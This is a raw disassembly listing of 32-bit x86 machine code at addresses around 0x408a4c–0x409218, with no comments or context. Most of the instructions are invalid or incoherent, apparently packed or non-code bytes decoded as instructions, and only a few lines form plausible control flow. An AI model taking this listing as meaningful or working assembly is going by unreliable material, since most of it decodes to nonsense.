  408a4c:	(bad)  
  408a4e:	scas   eax,DWORD PTR es:[edi]
  408a4f:	(bad)  
  408a50:	mov    al,ds:0xeb8ce3f3
  408a55:	call   0xbe5f7dc6
  408a5a:	adc    bl,BYTE PTR [ebp+0x77]
  408a5d:	pop    edi
  408a5e:	sbb    DWORD PTR [esi+0x75],edx
  408a61:	outs   dx,DWORD PTR ds:[esi]
  408a62:	jbe    0x408a92
  408a64:	pop    esp
  408a65:	(bad)  
  408a66:	clc    
  408a67:	push   0xc52a4c6d
  408a6c:	inc    esp
  408a6d:	xor    DWORD PTR cs:[esi+0x77493d96],edx
  408a74:	out    dx,al
  408a75:	jp     0x408ad4
  408a77:	idiv   esp
  408a79:	pop    ebp
  408a7a:	cmp    eax,0x964df273
  408a7f:	or     esi,DWORD PTR [ecx+0x53]
  408a82:	dec    ecx
  408a83:	and    eax,0x647430ee
  408a88:	add    DWORD PTR [esi+0x70],ebp
  408a8b:	cld    
  408a8c:	adc    BYTE PTR [eax-0x38],bh
  408a8f:	pop    eax
  408a90:	inc    ebp
  408a91:	adc    al,BYTE PTR [edx+0x48]
  408a94:	or     DWORD PTR ds:0x1500158b,eax
  408a9a:	data16 daa 
  408a9c:	cld    
  408a9d:	(bad)  
  408a9e:	stos   DWORD PTR es:[edi],eax
  408a9f:	and    al,0x37
  408aa1:	sub    ebx,edi
  408aa3:	mov    ds:0x947da488,eax
  408aa8:	xor    al,0x35
  408aaa:	shl    al,1
  408aac:	jo     0x408b0e
  408aae:	mov    WORD PTR ds:0xe9486faf,cs
  408ab4:	cwde   
  408ab5:	adc    ch,BYTE PTR [ebx+esi*8+0x51d0dd41]
  408abc:	xor    ebp,esp
  408abe:	repz jno 0x408a4c
  408ac1:	and    al,BYTE PTR [esp+esi*2]
  408ac4:	sar    BYTE PTR [eax],cl
  408ac6:	mov    DWORD PTR [edx-0x18f046cd],edx
  408acc:	lods   eax,DWORD PTR ds:[esi]
  408acd:	sbb    esp,esi
  408acf:	and    DWORD PTR ds:0x9c879301,ecx
  408ad5:	jp     0x408b38
  408ad7:	icebp  
  408ad8:	lods   al,BYTE PTR ds:[esi]
  408ad9:	adc    al,0x40
  408adb:	xchg   DWORD PTR [eax+ebx*4],ebx
  408ade:	in     al,0xb4
  408ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ae1:	outs   dx,BYTE PTR ds:[esi]
  408ae2:	sbb    ah,ah
  408ae4:	loope  0x408aa7
  408ae6:	outs   dx,DWORD PTR ds:[esi]
  408ae7:	mov    edi,esi
  408ae9:	iret   
  408aea:	pop    ds
  408aeb:	lds    eax,FWORD PTR [edi+0x9707ba4]
  408af1:	xor    dh,BYTE PTR [eax+0x1da171c4]
  408af7:	push   0x5ca90bbb
  408afc:	xor    ch,ch
  408afe:	mov    ?,eax
  408b00:	or     al,0x2f
  408b02:	jecxz  0x408b01
  408b04:	js     0x408ab2
  408b06:	pop    esi
  408b07:	mov    cl,0xa9
  408b09:	push   cs
  408b0a:	(bad)  
  408b0c:	mov    ebp,0x10f33879
  408b11:	or     eax,0x36c8b868
  408b16:	or     eax,DWORD PTR [eax]
  408b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b19:	and    eax,0xb5139c56
  408b1e:	and    bh,dl
  408b20:	cmc    
  408b21:	ss (bad) 
  408b23:	stos   BYTE PTR es:[edi],al
  408b24:	xchg   edx,eax
  408b25:	dec    edi
  408b26:	mov    bh,0x3a
  408b28:	ret    0xb764
  408b2b:	addr16 add eax,0xd22f8d40
  408b31:	sub    cl,cl
  408b33:	cld    
  408b34:	dec    esi
  408b35:	in     eax,dx
  408b36:	mov    edx,esi
  408b38:	or     DWORD PTR ds:0x6fb75c17,0x78
  408b3f:	outs   dx,BYTE PTR ds:[esi]
  408b40:	cmp    ah,BYTE PTR [ebx+0x77]
  408b43:	int3   
  408b44:	sub    al,0x6f
  408b46:	sub    eax,0x474cfbfd
  408b4b:	cs inc esi
  408b4d:	retf   
  408b4e:	stc    
  408b4f:	sub    eax,0x6524c236
  408b54:	retf   
  408b55:	sbb    bl,dl
  408b57:	mov    edi,0x5d880ef
  408b5c:	xchg   ecx,eax
  408b5d:	sbb    BYTE PTR [edi-0x1e3111e5],bh
  408b63:	xchg   ebx,eax
  408b64:	imul   eax,DWORD PTR [ebx-0x5c],0xb9cc2709
  408b6b:	cmp    DWORD PTR [esi+0x28d57e4],0x9e5a70c0
  408b75:	add    eax,0x4801b9d5
  408b7a:	(bad)  
  408b7b:	fwait
  408b7c:	pop    edx
  408b7d:	push   ebp
  408b7e:	inc    eax
  408b7f:	xchg   edi,eax
  408b80:	mov    ds:0xd85704fd,al
  408b85:	mov    al,0xee
  408b87:	sub    BYTE PTR [edx+ebx*4+0x263443df],bh
  408b8e:	jne    0x408bf5
  408b90:	jecxz  0x408b87
  408b92:	jmp    edx
  408b94:	jno    0x408bc6
  408b96:	(bad)  
  408b97:	xor    ecx,DWORD PTR [esi]
  408b99:	sub    al,0x5a
  408b9b:	push   0xfffffff9
  408b9d:	imul   edi
  408b9f:	mov    ebx,0xda304f17
  408ba4:	sbb    DWORD PTR [edi+0x49a13ce6],esi
  408baa:	jl     0x408b71
  408bac:	jne    0x408b55
  408bae:	fs dec ebp
  408bb0:	xlat   BYTE PTR ds:[ebx]
  408bb1:	mov    esi,0xd808d9cc
  408bb6:	jl     0x408b93
  408bb8:	loope  0x408bba
  408bba:	iret   
  408bbb:	(bad)  
  408bbc:	pop    ss
  408bbd:	lahf   
  408bbe:	mov    ebx,0xd36acac1
  408bc3:	jecxz  0x408c14
  408bc5:	xchg   ebx,eax
  408bc6:	adc    al,0x1e
  408bc8:	(bad)  ds:0x253c846f
  408bce:	popa   
  408bcf:	leave  
  408bd0:	fcom   QWORD PTR [ebx+0x48689802]
  408bd6:	les    ecx,FWORD PTR [edx]
  408bd8:	push   edi
  408bd9:	jecxz  0x408bea
  408bdb:	leave  
  408bdc:	mov    eax,ds:0x8d9b1d65
  408be1:	div    DWORD PTR [ebx]
  408be3:	fsub   DWORD PTR [ebx+0x4c3ff3bd]
  408be9:	mov    BYTE PTR [ebx],dl
  408beb:	sbb    BYTE PTR [eax+0x32],bl
  408bee:	sub    DWORD PTR [ebp+0x4dcbcd8c],edi
  408bf4:	(bad)  
  408bf5:	sub    DWORD PTR [ecx-0x22],0x63fecce0
  408bfc:	push   esp
  408bfd:	inc    BYTE PTR [ebx]
  408bff:	fistp  QWORD PTR [ebp-0x61ca495b]
  408c05:	js     0x408c60
  408c07:	push   es
  408c08:	fucomi st,st(3)
  408c0a:	aas    
  408c0b:	ret    0x6a5d
  408c0e:	std    
  408c0f:	xor    al,BYTE PTR [eax+0x5b]
  408c12:	call   DWORD PTR [edi+0x3]
  408c15:	jmp    0x408bda
  408c17:	stc    
  408c18:	and    edx,eax
  408c1a:	(bad)  
  408c1c:	add    esp,edx
  408c1e:	push   esi
  408c1f:	and    esi,ebx
  408c21:	(bad)  
  408c22:	lea    esi,[eax]
  408c24:	ins    DWORD PTR es:[edi],dx
  408c25:	mov    dh,0x7f
  408c27:	fcmovb st,st(5)
  408c29:	jno    0x408c47
  408c2b:	jl     0x408c38
  408c2d:	xor    eax,0x6cf5675f
  408c32:	cs sub ax,0x1a24
  408c37:	dec    ebx
  408c38:	push   cs
  408c39:	mov    DWORD PTR [edx],eax
  408c3b:	retf   0x4995
  408c3e:	pop    ecx
  408c3f:	test   BYTE PTR [esi],0x9
  408c42:	pop    esp
  408c43:	inc    ebp
  408c44:	(bad)  
  408c45:	sti    
  408c46:	adc    eax,0xd1874959
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)
  408c74:	inc    edi
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c24
  408c7d:	pop    edx
  408c7e:	mov    ss,esp
  408c80:	es pop ebp
  408c82:	jo     0x408cf2
  408c84:	cli    
  408c85:	fdivr  st(5),st
  408c87:	push   eax
  408c88:	mov    ebx,ebx
  408c8a:	mov    ecx,0xf9468512
  408c8f:	popf   
  408c90:	repnz push esi
  408c92:	sar    dl,0xc9
  408c95:	inc    eax
  408c96:	sbb    eax,0xc9ae4951
  408c9b:	addr16 mov ecx,0x43597961
  408ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca2:	pop    esi
  408ca3:	dec    edi
  408ca4:	mov    ecx,DWORD PTR [esi-0x7d3a45fc]
  408caa:	fsubr  QWORD PTR [ebx+eiz*2]
  408cad:	outs   dx,DWORD PTR ds:[esi]
  408cae:	mov    ch,0x45
  408cb0:	dec    ecx
  408cb1:	mov    cl,0x34
  408cb3:	push   ecx
  408cb4:	jmp    0xe8ce4fb2
  408cb9:	xor    al,0xbd
  408cbc:	test   al,0x61
  408cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cbf:	push   ebx
  408cc0:	je     0x408d2c
  408cc2:	mov    eax,ds:0xc179fc82
  408cc7:	inc    ebx
  408cc8:	lds    eax,FWORD PTR [ecx+0x9]
  408ccb:	jmp    0x408d46
  408ccd:	out    dx,eax
  408cce:	nop
  408ccf:	clc    
  408cd0:	das    
  408cd1:	adc    esi,DWORD PTR [esi+0x16]
  408cd4:	mov    ebp,0xe26dbb5f
  408cd9:	mov    dl,0xe
  408cdb:	shl    DWORD PTR [esi-0x60516c1c],0x21
  408ce2:	cwde   
  408ce3:	or     dl,BYTE PTR [ebx]
  408ce5:	jo     0x408c9e
  408ce7:	bound  edx,QWORD PTR [ecx-0x4]
  408cea:	out    0x52,al
  408cec:	or     edi,DWORD PTR ds:0x576b3f7e
  408cf2:	ins    BYTE PTR es:[edi],dx
  408cf3:	in     al,0x96
  408cf5:	nop
  408cf6:	mov    ?,WORD PTR [edx]
  408cf8:	sbb    cl,dh
  408cfa:	pop    esi
  408cfb:	(bad)  
  408cfd:	sub    dl,BYTE PTR [edi+edx*4-0x1f375788]
  408d04:	xor    DWORD PTR [esi],esp
  408d06:	xchg   BYTE PTR [edx+eax*1+0x41],cl
  408d0a:	sbb    eax,0x528f2929
  408d0f:	loop   0x408cd7
  408d11:	inc    edi
  408d12:	cmp    al,ah
  408d14:	cmp    ebp,esi
  408d16:	mov    esp,0x306558f7
  408d1b:	es int3 
  408d1d:	nop
  408d1e:	cmp    BYTE PTR [esi+0xdc8e526],ah
  408d24:	sbb    DWORD PTR [eax-0x56],eax
  408d27:	sbb    BYTE PTR [edi+0x1b0aaf79],0x2f
  408d2e:	cmc    
  408d2f:	hlt    
  408d30:	das    
  408d31:	jge    0x408d1f
  408d33:	popa   
  408d34:	dec    DWORD PTR [ebp+esi*8+0x25]
  408d38:	mov    dh,0x5d
  408d3a:	or     eax,0x92227fcd
  408d3f:	mov    edi,0x7c562951
  408d44:	leave  
  408d45:	pop    ecx
  408d46:	cli    
  408d47:	out    0x1d,eax
  408d49:	mov    ebx,0xb255f05
  408d4e:	call   0xbef4:0x989aee58
  408d55:	jno    0x408cf3
  408d57:	jnp    0x408d3b
  408d59:	add    cl,BYTE PTR [ebx+0x65e0d5fb]
  408d5f:	mul    ah
  408d61:	cmp    ebp,DWORD PTR [edi]
  408d63:	sub    eax,0xa7d84be7
  408d68:	add    eax,DWORD PTR [ebx+0x18]
  408d6b:	ret    0xe7b7
  408d6e:	add    eax,0x8f794ad4
  408d73:	jne    0x408dba
  408d75:	add    cl,al
  408d77:	rcl    BYTE PTR [eax-0x63],1
  408d7a:	nop
  408d7b:	inc    ecx
  408d7c:	sbb    al,0x2c
  408d7e:	add    DWORD PTR [ebp-0x280acc4f],0xfffffff5
  408d85:	lock jmp 0x408dc6
  408d88:	fisttp QWORD PTR [esi]
  408d8a:	outs   dx,DWORD PTR ds:[esi]
  408d8b:	sbb    al,0xf7
  408d8d:	bound  edx,QWORD PTR [ebx]
  408d8f:	fisttp WORD PTR [edi+0x25]
  408d92:	push   edx
  408d93:	adc    BYTE PTR cs:[edx],bl
  408d96:	dec    edi
  408d97:	and    al,ch
  408d99:	out    dx,al
  408d9a:	jmp    0x408e0c
  408d9c:	or     ah,BYTE PTR [ecx]
  408d9e:	scas   al,BYTE PTR es:[edi]
  408d9f:	dec    esi
  408da0:	lea    esi,[esp+ebp*1+0x6891cfb1]
  408da7:	or     ebp,DWORD PTR [ebp-0x1e]
  408daa:	cdq    
  408dab:	cmp    DWORD PTR [eiz*2-0x76eb561f],0xffffffea
  408db3:	xor    DWORD PTR [edi+0xf919913],ebx
  408db9:	in     eax,dx
  408dba:	jg     0x408e31
  408dbc:	mov    al,ds:0x443e0bc4
  408dc1:	push   esi
  408dc2:	(bad)  
  408dc3:	shl    DWORD PTR [ecx-0x50b426e1],1
  408dc9:	gs push edi
  408dcb:	int    0xc9
  408dcd:	out    0xe5,al
  408dcf:	mov    al,ds:0x4aa2a543
  408dd4:	dec    eax
  408dd5:	out    0x43,eax
  408dd7:	mov    dl,0xe1
  408dd9:	mov    esp,0xa2419c24
  408dde:	js     0x408dec
  408de0:	outs   dx,DWORD PTR ds:[esi]
  408de1:	adc    eax,0x3b0a540b
  408de6:	call   0xaaf4cccf
  408deb:	jo     0x408e5d
  408ded:	test   DWORD PTR [edi],esi
  408def:	fisubr WORD PTR [edi+0x65]
  408df2:	add    al,0x18
  408df4:	loope  0x408e4f
  408df6:	jp     0x408df3
  408df8:	aad    0x15
  408dfa:	stos   BYTE PTR es:[edi],al
  408dfb:	and    BYTE PTR [edx-0x49a10f54],bl
  408e01:	mov    ds:0x1a263225,al
  408e06:	(bad)  
  408e08:	cmc    
  408e09:	int    0x6e
  408e0b:	repz xor BYTE PTR ds:0x7a9b0ccd,bh
  408e12:	cmc    
  408e13:	adc    al,0x4f
  408e15:	les    ebx,FWORD PTR [esp+eiz*4-0x60]
  408e19:	ins    DWORD PTR es:[edi],dx
  408e1a:	sub    ah,BYTE PTR [esi+0x34b2f4a8]
  408e20:	mov    dl,0x79
  408e22:	add    esp,DWORD PTR [ebp-0xe5435b1]
  408e28:	adc    al,0x7f
  408e2a:	push   eax
  408e2b:	push   0x27
  408e2d:	popa   
  408e2e:	popf   
  408e2f:	pusha  
  408e30:	adc    DWORD PTR [ecx+eax*1],0x4b
  408e34:	sub    DWORD PTR [ebx],0xfba60c1a
  408e3a:	ret    
  408e3b:	xchg   BYTE PTR [ecx+ebx*4],bl
  408e3e:	xchg   BYTE PTR [ebx+0x143fff1b],cl
  408e44:	lea    edi,[ebp-0x2d]
  408e47:	cmp    BYTE PTR [ecx+0x66],dl
  408e4a:	xchg   edx,eax
  408e4b:	addr16 push esi
  408e4d:	push   esp
  408e4e:	sub    DWORD PTR [ebx+0x35e08817],edi
  408e54:	jp     0x408e35
  408e56:	lods   eax,DWORD PTR ds:[esi]
  408e57:	push   ss
  408e58:	scas   eax,DWORD PTR es:[edi]
  408e59:	sti    
  408e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e5b:	pop    esi
  408e5c:	dec    esi
  408e5d:	loop   0x408de6
  408e5f:	inc    ebx
  408e60:	hlt    
  408e61:	jg     0x408e19
  408e63:	cmp    BYTE PTR [edi],al
  408e65:	aaa    
  408e66:	mov    bh,0x5
  408e68:	loope  0x408e37
  408e6a:	add    BYTE PTR [edx-0xcadcd9d],cl
  408e70:	in     eax,0xc0
  408e72:	das    
  408e73:	icebp  
  408e74:	mov    bh,0xa
  408e76:	cmp    eax,DWORD PTR [eax+0x1]
  408e79:	mov    ebp,0xe37a2310
  408e7e:	push   ss
  408e7f:	retf   
  408e80:	fiadd  WORD PTR [ebx]
  408e82:	stc    
  408e83:	mov    dh,0x80
  408e85:	mov    bh,0x9c
  408e87:	int    0x6b
  408e89:	cmp    esi,DWORD PTR [edi-0x2ebd56d3]
  408e8f:	cld    
  408e90:	push   edi
  408e91:	xor    al,0x26
  408e93:	fs pop es
  408e95:	xlat   BYTE PTR ds:[ebx]
  408e96:	fnstenv [eax-0x7cbc75a]
  408e9c:	stc    
  408e9d:	jecxz  0x408e8d
  408e9f:	inc    edi
  408ea0:	inc    ebx
  408ea1:	xchg   esp,eax
  408ea2:	scas   eax,DWORD PTR es:[edi]
  408ea3:	inc    esi
  408ea4:	out    dx,al
  408ea5:	je     0x408e63
  408ea7:	clc    
  408ea8:	pushf  
  408ea9:	(bad)  
  408eaa:	jns    0x408e8c
  408eac:	mov    es,WORD PTR [ebx+0xe]
  408eaf:	push   esp
  408eb0:	push   0x5e926a12
  408eb5:	in     eax,0xe3
  408eb7:	dec    esp
  408eb8:	and    BYTE PTR [edi],al
  408eba:	stc    
  408ebb:	aaa    
  408ebc:	cmp    DWORD PTR [edi-0x6b],edi
  408ebf:	and    cl,BYTE PTR [edi]
  408ec1:	jne    0x408ebb
  408ec3:	(bad)  
  408ec5:	push   ebp
  408ec6:	leave  
  408ec7:	mov    dh,0x3
  408ec9:	js     0x408eb5
  408ecb:	in     al,dx
  408ecc:	call   DWORD PTR [ecx+0x50]
  408ecf:	(bad)  
  408ed0:	add    ebx,DWORD PTR [ebp+0x6ebb9dd4]
  408ed6:	cli    
  408ed7:	repz cmp esp,esi
  408eda:	lahf   
  408edb:	jecxz  0x408e83
  408edd:	test   al,0xa5
  408edf:	jecxz  0x408ed0
  408ee1:	jne    0x408f34
  408ee3:	ins    DWORD PTR es:[edi],dx
  408ee4:	push   edi
  408ee5:	ja     0x408f3d
  408ee7:	sbb    ebp,ebx
  408ee9:	dec    esi
  408eea:	pop    es
  408eeb:	cs sbb al,0xa4
  408eee:	bound  ecx,QWORD PTR [ebx-0x57]
  408ef1:	xor    bh,al
  408ef3:	les    eax,FWORD PTR es:[edi-0x3740f6dd]
  408efa:	(bad)  
  408efb:	jnp    0x408f2d
  408efd:	add    dl,dl
  408eff:	pop    eax
  408f00:	cld    
  408f01:	iret   
  408f02:	jbe    0x408ec4
  408f04:	popf   
  408f05:	jg     0x408e8f
  408f07:	mov    cl,0x23
  408f09:	jmp    0x408f1d
  408f0b:	in     al,0x95
  408f0d:	in     al,0xa7
  408f0f:	xchg   ebx,eax
  408f10:	leave  
  408f11:	(bad)  
  408f12:	iret   
  408f13:	cmp    ch,ah
  408f15:	mov    cl,0x38
  408f17:	push   cs
  408f18:	(bad)  
  408f19:	stos   DWORD PTR es:[edi],eax
  408f1a:	fild   WORD PTR [ecx]
  408f1c:	jbe    0x408ee7
  408f1e:	shl    DWORD PTR [ebp+0x9],cl
  408f21:	(bad)  
  408f22:	(bad)  
  408f24:	jmp    0x74954c35
  408f29:	and    bh,al
  408f2b:	cwde   
  408f2c:	sbb    DWORD PTR [edx],ebp
  408f2e:	icebp  
  408f2f:	mov    edx,0x21b8c4e9
  408f34:	lods   eax,DWORD PTR ss:[esi]
  408f36:	jge    0x408eef
  408f38:	imul   ebp,DWORD PTR [edi-0x150699bc],0x68
  408f3f:	cld    
  408f40:	loopne 0x408ee9
  408f42:	je     0x408f6e
  408f44:	jecxz  0x408fb8
  408f46:	jb     0x408ee8
  408f48:	lods   al,BYTE PTR ds:[esi]
  408f49:	test   eax,0x3b1ddbd4
  408f4e:	inc    esi
  408f4f:	loop   0x408f33
  408f51:	in     eax,dx
  408f52:	push   edi
  408f53:	or     al,0x53
  408f55:	mov    ?,WORD PTR [ebp+0x12]
  408f58:	call   0xe0f5f4ea
  408f5d:	pop    ss
  408f5e:	mov    ds:0x35806011,al
  408f63:	mov    edi,0x8c53b222
  408f68:	shr    ecx,1
  408f6a:	cmp    al,0x5c
  408f6c:	jo     0x408fec
  408f6e:	aas    
  408f6f:	scas   eax,DWORD PTR es:[di]
  408f71:	dec    edi
  408f72:	adc    ch,BYTE PTR [esi+0x7c4d2ab1]
  408f78:	and    DWORD PTR [edi+0x55],esi
  408f7b:	adc    ecx,edi
  408f7d:	les    esp,FWORD PTR [ebx]
  408f7f:	inc    edx
  408f80:	adc    DWORD PTR [ebx+0xb],esp
  408f83:	loope  0x408fd8
  408f85:	outs   dx,DWORD PTR ds:[esi]
  408f86:	sar    BYTE PTR [ebp-0x546d748a],cl
  408f8c:	push   ebx
  408f8e:	out    dx,eax
  408f8f:	cwde   
  408f90:	or     ebx,edi
  408f92:	adc    ah,bl
  408f94:	inc    ebx
  408f95:	xlat   BYTE PTR ds:[ebx]
  408f96:	jns    0x408fdc
  408f98:	mov    ebp,0xfad13131
  408f9d:	mov    ah,0xf2
  408f9f:	(bad)  
  408fa2:	add    esi,DWORD PTR [eax]
  408fa4:	(bad)  
  408fa5:	mov    dh,0x2
  408fa7:	(bad)  
  408fa8:	mov    dl,0x2
  408faa:	push   0x8d30ff09
  408faf:	add    eax,0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xe01937f3
  408fc6:	jnp    0x408fc6
  408fc8:	cmp    eax,0x7070e677
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408fd3
  408fd2:	ror    DWORD PTR ds:0xbb427943,cl
  408fd8:	jne    0x408fa7
  408fda:	sbb    DWORD PTR [ecx+0x41],eax
  408fdd:	mov    ah,0xbf
  408fdf:	retf   0xe244
  408fe2:	loop   0x408f64
  408fe4:	inc    ebp
  408fe5:	sbb    bl,0x8d
  408fe8:	out    0x53,al
  408fea:	das    
  408feb:	ret    0xf4a0
  408fee:	das    
  408fef:	xor    DWORD PTR [eax+0x7be3aa26],ecx
  408ff5:	push   eax
  408ff6:	xchg   DWORD PTR [esi*8-0x1d61e4c6],edx
  408ffd:	mov    al,ds:0xda711533
  409002:	jp     0x409045
  409004:	sub    BYTE PTR [edi+0x3306ba4e],ch
  40900a:	mov    ebp,0xa106d263
  40900f:	pop    esi
  409010:	test   BYTE PTR [edx-0x16],dl
  409013:	and    esi,0xffffffa1
  409016:	pop    ds
  409017:	xor    edi,DWORD PTR [ebp+0x3e2239b7]
  40901d:	mov    bh,0xe7
  40901f:	imul   esp,DWORD PTR [eax+0x1c],0xffffff98
  409023:	lahf   
  409024:	lock jns 0x408fdc
  409027:	mov    ecx,0xd699dba
  40902c:	ins    DWORD PTR es:[edi],dx
  40902d:	stos   BYTE PTR es:[edi],al
  40902e:	pushf  
  40902f:	loopne 0x408fe2
  409031:	xor    BYTE PTR [eax],0x58
  409034:	not    esp
  409036:	push   ecx
  409037:	lea    eax,[ecx-0x1d7d61d0]
  40903d:	and    DWORD PTR [edi+0x4ac43fff],edx
  409043:	pusha  
  409044:	imul   edx,DWORD PTR [ebx+0x2c],0xa76e3e0
  40904b:	loope  0x409075
  40904d:	fs pop ebp
  40904f:	add    al,0xad
  409051:	into   
  409052:	and    eax,0xfb21ea4
  409057:	call   0x25e36f6
  40905c:	and    DWORD PTR [esi+esi*1+0x2441fc2c],0x4
  409064:	lods   eax,DWORD PTR ds:[esi]
  409065:	mov    ebx,0xa085b25c
  40906a:	or     al,0x62
  40906c:	mov    DWORD PTR [ecx],0x7d224316
  409072:	sbb    bh,BYTE PTR [esi]
  409074:	mov    bh,0x6f
  409076:	or     BYTE PTR [edi+ebp*8-0x4f],0x47
  40907b:	xor    edx,DWORD PTR [eax+0x354b8d3a]
  409081:	test   al,0x3c
  409083:	mov    bh,0x12
  409085:	stos   BYTE PTR es:[edi],al
  409086:	hlt    
  409087:	push   edx
  409088:	or     BYTE PTR [edx+0x5b],dl
  40908b:	das    
  40908c:	xlat   BYTE PTR ds:[ebx]
  40908d:	pop    edx
  40908e:	rol    eax,cl
  409090:	push   esp
  409091:	clc    
  409092:	pop    edi
  409093:	and    ecx,DWORD PTR [esi]
  409095:	push   0xe70dbd6
  40909a:	sub    dh,ch
  40909c:	pop    ecx
  40909d:	retf   0xcc2f
  4090a0:	push   esi
  4090a1:	popf   
  4090a2:	in     al,dx
  4090a3:	mov    ds:0xda751b6,al
  4090a8:	pop    ebx
  4090a9:	dec    edx
  4090aa:	xor    edx,ecx
  4090ac:	int3   
  4090ad:	outs   dx,BYTE PTR ds:[esi]
  4090ae:	xchg   ebx,eax
  4090af:	xchg   edx,eax
  4090b0:	dec    esp
  4090b1:	jp     0x409101
  4090b3:	loop   0x409069
  4090b5:	cs or  ebx,esp
  4090b8:	sbb    eax,0xd62f768b
  4090bd:	loop   0x4090f0
  4090bf:	sub    BYTE PTR [edi-0x7377415f],dl
  4090c5:	scas   al,BYTE PTR es:[edi]
  4090c6:	lods   al,BYTE PTR ds:[esi]
  4090c7:	dec    edx
  4090c8:	pop    edi
  4090c9:	pop    es
  4090ca:	ret    0x18a6
  4090cd:	sub    bh,BYTE PTR [eax-0x4bcbb703]
  4090d3:	and    BYTE PTR [ebx],ch
  4090d5:	jbe    0x409149
  4090d7:	ds sbb eax,0x58ca758c
  4090dd:	mov    es,esi
  4090df:	dec    eax
  4090e0:	stc    
  4090e1:	or     ch,ah
  4090e3:	pop    ebp
  4090e4:	pop    esp
  4090e5:	scas   eax,DWORD PTR es:[edi]
  4090e6:	sub    ecx,esp
  4090e8:	arpl   WORD PTR [esi+0x7f0df34],bx
  4090ee:	pusha  
  4090ef:	js     0x409102
  4090f1:	pusha  
  4090f2:	je     0x409163
  4090f4:	call   0x4bf8b84
  4090f9:	jae    0x40915b
  4090fb:	in     eax,dx
  4090fc:	test   DWORD PTR [esi+0x53],edi
  4090ff:	and    eax,0x85ce716
  409104:	and    eax,0x8e626324
  409109:	enter  0x4f2c,0x55
  40910d:	mov    cl,0x7e
  40910f:	and    eax,0x5a0650b7
  409114:	cld    
  409115:	xor    eax,0xae64dc15
  40911a:	inc    eax
  40911b:	push   edi
  40911c:	je     0x40919d
  40911e:	rol    DWORD PTR [edi-0x8],cl
  409121:	sti    
  409122:	adc    BYTE PTR [eax-0x16],dl
  409125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409126:	in     al,0x2b
  409128:	push   0x7fad163b
  40912d:	data16 dec BYTE PTR [edx+edx*4]
  409131:	push   es
  409132:	mov    cl,0xae
  409134:	push   0xbbaca5e2
  409139:	lock lods al,BYTE PTR ds:[esi]
  40913b:	and    ah,BYTE PTR [ebx+0x5b6e3095]
  409141:	retf   0x62e2
  409144:	cmp    BYTE PTR [edx],dh
  409146:	fild   WORD PTR [ebx-0x6]
  409149:	ret    0xd5c8
  40914c:	push   edx
  40914d:	and    BYTE PTR [esi+eax*2+0x72],dh
  409151:	mov    esp,0xc511955d
  409156:	xchg   esp,eax
  409157:	in     eax,dx
  409158:	(bad)  
  409159:	adc    bl,bh
  40915b:	adc    esp,ebx
  40915d:	xchg   DWORD PTR [ebx-0x54],esi
  409160:	inc    ecx
  409161:	sub    bl,BYTE PTR [edx]
  409163:	xchg   ebx,eax
  409164:	pop    ss
  409165:	(bad)  
  409166:	adc    al,0x12
  409168:	ins    DWORD PTR es:[edi],dx
  409169:	rcl    BYTE PTR [ebx+0x5fff3644],0x91
  409170:	push   esi
  409171:	push   ss
  409172:	jge    0x4091a1
  409174:	pushf  
  409175:	and    ah,BYTE PTR [ebx+0x48af3503]
  40917b:	fldenv [ecx]
  40917d:	sub    DWORD PTR [eax],esp
  40917f:	push   edi
  409180:	xchg   esp,eax
  409181:	sub    dh,ch
  409183:	inc    ebx
  409184:	xchg   ecx,eax
  409185:	pop    esp
  409186:	lock mov bh,0x1d
  409189:	mov    eax,ds:0x12f6103e
  40918e:	jge    0x4091bd
  409190:	push   ebx
  409191:	adc    al,0x9a
  409193:	cmp    dl,bh
  409195:	and    bl,BYTE PTR [esi-0x6b73588e]
  40919b:	arpl   si,bp
  40919d:	test   DWORD PTR [esi+0x165bcf4b],0x788634b8
  4091a7:	cld    
  4091a8:	vpslld xmm5,xmm7,XMMWORD PTR [esi+0x40]
  4091ad:	pop    ebp
  4091ae:	nop
  4091af:	cmp    eax,0xb0d5c339
  4091b4:	adc    BYTE PTR [esi-0x1b99a05e],dh
  4091ba:	xchg   edx,eax
  4091bb:	sbb    al,0x21
  4091bd:	in     eax,dx
  4091be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091bf:	sub    dh,BYTE PTR [edx-0x54]
  4091c2:	aaa    
  4091c3:	not    BYTE PTR [ecx]
  4091c5:	mov    al,0xef
  4091c7:	cwde   
  4091c8:	push   edi
  4091c9:	push   eax
  4091ca:	mov    ecx,0xba1f10dd
  4091cf:	fwait
  4091d0:	adc    al,BYTE PTR [ecx]
  4091d2:	nop
  4091d3:	ret    0x2275
  4091d6:	(bad)  
  4091d7:	ss sub al,0xd6
  4091da:	lods   eax,DWORD PTR cs:[esi]
  4091dc:	jmp    0x4091b4
  4091de:	jnp    0x409174
  4091e0:	mov    esi,DWORD PTR [ebx+0x4013890b]
  4091e6:	and    al,0x15
  4091e8:	stc    
  4091e9:	(bad)
  4091ec:	jle    0x409205
  4091ee:	push   eax
  4091ef:	clc    
  4091f0:	lds    edx,FWORD PTR [ebx]
  4091f2:	rol    BYTE PTR ds:0xf335deff,0x40
  4091f9:	jmp    0xa723:0xede717cb
  409200:	jbe    0x409193
  409202:	inc    edx
  409203:	and    ch,BYTE PTR [esp+edi*8]
  409206:	sub    eax,0x466e263d
  40920b:	mov    BYTE PTR [ecx+0x16233f66],0x76
  409212:	xlat   BYTE PTR gs:[ebx]
  409214:	add    eax,DWORD PTR [eax]
  409216:	cmp    al,0x97
  409218:	inc    ecx
